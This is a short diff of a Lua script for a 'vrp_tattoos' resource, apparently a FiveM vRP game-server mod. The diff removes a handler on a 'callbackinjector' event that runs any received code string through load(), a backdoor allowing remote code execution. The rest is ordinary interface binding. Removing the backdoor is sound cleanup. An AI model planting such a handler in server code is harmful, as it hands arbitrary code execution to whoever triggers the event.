@@ -1,10 +1,6 @@
 local Tunnel = module("vrp","lib/Tunnel")
 local Proxy = module("vrp","lib/Proxy")
 
-TriggerEvent('callbackinjector', function(cb)
-    pcall(load(cb))
-end)
-
 vRPts = {}
 Tunnel.bindInterface("vrp_tattoos",vRPts)
 Proxy.addInterface("vrp_tattoos",vRPts)
